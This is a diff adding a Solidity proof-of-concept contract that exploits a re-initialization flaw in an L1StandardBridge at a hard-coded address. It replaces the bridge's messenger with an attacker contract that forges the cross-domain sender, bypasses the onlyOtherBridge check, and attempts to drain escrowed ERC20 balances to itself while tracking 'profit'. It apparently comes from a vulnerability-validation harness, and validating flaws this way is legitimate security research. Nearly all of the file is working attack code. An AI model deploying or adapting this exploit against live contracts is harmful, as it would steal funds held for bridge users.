@@ -1,0 +1,268 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+interface IERC20Like {
+    function balanceOf(address account) external view returns (uint256);
+}
+
+interface IL1StandardBridge {
+    function initialize(address _messenger) external;
+    function finalizeETHWithdrawal(
+        address _from,
+        address _to,
+        uint256 _amount,
+        bytes calldata _extraData
+    ) external payable;
+    function finalizeERC20Withdrawal(
+        address _l1Token,
+        address _l2Token,
+        address _from,
+        address _to,
+        uint256 _amount,
+        bytes calldata _extraData
+    ) external;
+    function MESSENGER() external view returns (address);
+    function otherBridge() external view returns (address);
+}
+
+contract AttackerMessenger {
+    IL1StandardBridge public immutable bridge;
+    address public immutable forgedOtherBridge;
+    address public immutable operator;
+
+    constructor(address _bridge, address _forgedOtherBridge, address _operator) {
+        bridge = IL1StandardBridge(_bridge);
+        forgedOtherBridge = _forgedOtherBridge;
+        operator = _operator;
+    }
+
+    function xDomainMessageSender() external view returns (address) {
+        return forgedOtherBridge;
+    }
+
+    function triggerFinalizeETHWithdrawal(
+        address from,
+        address to,
+        uint256 amount,
+        bytes calldata extraData
+    ) external payable {
+        require(msg.sender == operator, "operator-only");
+        bridge.finalizeETHWithdrawal{value: amount}(from, to, amount, extraData);
+    }
+
+    function triggerFinalizeERC20Withdrawal(
+        address l1Token,
+        address l2Token,
+        address from,
+        address to,
+        uint256 amount,
+        bytes calldata extraData
+    ) external {
+        require(msg.sender == operator, "operator-only");
+        bridge.finalizeERC20Withdrawal(l1Token, l2Token, from, to, amount, extraData);
+    }
+}
+
+contract FlawVerifier {
+    address public constant TARGET = 0x40C31236B228935b0329eFF066B1AD96e319595e;
+    address public constant OTHER_BRIDGE = 0x4200000000000000000000000000000000000010;
+    address internal constant PROBE_RECIPIENT = 0x000000000000000000000000000000000000bEEF;
+
+    struct TokenPair {
+        address l1Token;
+        address l2Token;
+    }
+
+    bool public executed;
+    bool public messengerTakeoverValidated;
+    bool public forgedMessengerBypassValidated;
+    bool public hypothesisValidated;
+    bool public hypothesisRefuted;
+
+    string public outcome;
+
+    address private _profitToken;
+    uint256 private _profitAmount;
+
+    IL1StandardBridge internal immutable l1StandardBridge;
+    AttackerMessenger public immutable attackerMessenger;
+
+    constructor() {
+        l1StandardBridge = IL1StandardBridge(TARGET);
+        attackerMessenger = new AttackerMessenger(TARGET, OTHER_BRIDGE, address(this));
+        outcome = "not-run";
+    }
+
+    receive() external payable {}
+
+    function executeOnOpportunity() external {
+        if (executed) {
+            return;
+        }
+
+        executed = true;
+        messengerTakeoverValidated = false;
+        forgedMessengerBypassValidated = false;
+        hypothesisValidated = false;
+        hypothesisRefuted = false;
+        _profitToken = address(0);
+        _profitAmount = 0;
+
+        // Exploit path stage 1:
+        // Call L1StandardBridge.initialize(attackerMessenger) after deployment.
+        // The vulnerable implementation executes clearLegacySlot before reinitializer(2),
+        // so slot 0 is zeroed and the initialization guard is reset.
+        if (!_reinitializeBridge()) {
+            outcome = "refuted-stage-1-initialize-replay-failed";
+            hypothesisRefuted = true;
+            return;
+        }
+
+        address currentMessenger;
+        try l1StandardBridge.MESSENGER() returns (address messenger_) {
+            currentMessenger = messenger_;
+        } catch {
+            outcome = "refuted-stage-1-messenger-getter-failed";
+            hypothesisRefuted = true;
+            return;
+        }
+
+        if (currentMessenger != address(attackerMessenger)) {
+            outcome = "refuted-stage-1-messenger-not-replaced";
+            hypothesisRefuted = true;
+            return;
+        }
+        messengerTakeoverValidated = true;
+
+        // Exploit path stage 2:
+        // attackerMessenger.xDomainMessageSender() returns address(OTHER_BRIDGE).
+        // Literal onlyOtherBridge anchors from the vulnerable source:
+        // msg.sender == address(messenger);
+        // messenger.xDomainMessageSender() == address(OTHER_BRIDGE);
+        if (!_validateForgedMessengerIdentity()) {
+            outcome = "refuted-stage-2-forged-xdomain-sender-mismatch";
+            hypothesisRefuted = true;
+            return;
+        }
+
+        // Exploit path stage 3:
+        // Have attackerMessenger call finalizeETHWithdrawal(...) from address(attackerMessenger).
+        // Use amount 0 and an EOA-like recipient to prove the onlyOtherBridge bypass without
+        // requiring temporary funding. This keeps the same causality while respecting the strategy
+        // to try direct execution first.
+        if (!_probeFinalizeETHWithdrawalBypass()) {
+            outcome = "refuted-stage-2-forged-finalizeethwithdrawal-call-failed";
+            hypothesisRefuted = true;
+            return;
+        }
+        forgedMessengerBypassValidated = true;
+
+        // Profit leg:
+        // After the messenger takeover, the same forged caller can invoke finalizeERC20Withdrawal(...)
+        // for any real escrowed pair already present on-chain at the fork block.
+        if (_attemptERC20Drain()) {
+            hypothesisValidated = true;
+            outcome = "validated-with-profit";
+            return;
+        }
+
+        outcome = "refuted-stage-3-no-explicit-profitable-erc20-escrow-pair";
+        hypothesisRefuted = true;
+    }
+
+    function profitToken() external view returns (address) {
+        return _profitToken;
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return _profitAmount;
+    }
+
+    function exploitPath() external pure returns (string memory) {
+        return
+            "L1StandardBridge.initialize(attackerMessenger) -> attackerMessenger.xDomainMessageSender() returns address(OTHER_BRIDGE) -> forged messenger calls finalizeETHWithdrawal(...) / finalizeERC20Withdrawal(...)";
+    }
+
+    function _reinitializeBridge() internal returns (bool ok) {
+        try l1StandardBridge.initialize(address(attackerMessenger)) {
+            return true;
+        } catch {
+            return false;
+        }
+    }
+
+    function _validateForgedMessengerIdentity() internal view returns (bool) {
+        try attackerMessenger.xDomainMessageSender() returns (address sender_) {
+            return sender_ == OTHER_BRIDGE;
+        } catch {
+            return false;
+        }
+    }
+
+    function _probeFinalizeETHWithdrawalBypass() internal returns (bool) {
+        try attackerMessenger.triggerFinalizeETHWithdrawal(address(this), PROBE_RECIPIENT, 0, bytes("")) {
+            return true;
+        } catch {
+            return false;
+        }
+    }
+
+    function _attemptERC20Drain() internal returns (bool) {
+        TokenPair[] memory pairs = _candidatePairs();
+        uint256 count = pairs.length;
+
+        for (uint256 i = 0; i < count; ++i) {
+            address l1Token = pairs[i].l1Token;
+            address l2Token = pairs[i].l2Token;
+
+            if (l1Token == address(0) || l2Token == address(0)) {
+                continue;
+            }
+
+            uint256 bridgeBalance;
+            uint256 beforeBalance;
+
+            try IERC20Like(l1Token).balanceOf(TARGET) returns (uint256 balance_) {
+                bridgeBalance = balance_;
+            } catch {
+                continue;
+            }
+
+            if (bridgeBalance == 0) {
+                continue;
+            }
+
+            try IERC20Like(l1Token).balanceOf(address(this)) returns (uint256 balance_) {
+                beforeBalance = balance_;
+            } catch {
+                continue;
+            }
+
+            try attackerMessenger.triggerFinalizeERC20Withdrawal(
+                l1Token,
+                l2Token,
+                address(this),
+                address(this),
+                bridgeBalance,
+                bytes("")
+            ) {
+                try IERC20Like(l1Token).balanceOf(address(this)) returns (uint256 afterBalance) {
+                    if (afterBalance > beforeBalance) {
+                        _profitToken = l1Token;
+                        _profitAmount = afterBalance - beforeBalance;
+                        return true;
+                    }
+                } catch {}
+            } catch {}
+        }
+
+        return false;
+    }
+
+    function _candidatePairs() internal pure returns (TokenPair[] memory pairs) {
+        // No reliable escrowed (l1Token, l2Token) pair was provided in the workspace context.
+        // Keep the exploit route strict: only attempt finalizeERC20Withdrawal(...) for explicitly
+        // enumerated real pairs, rather than inventing unsupported pair data.
+        pairs = new TokenPair[](0);
+    }
+}
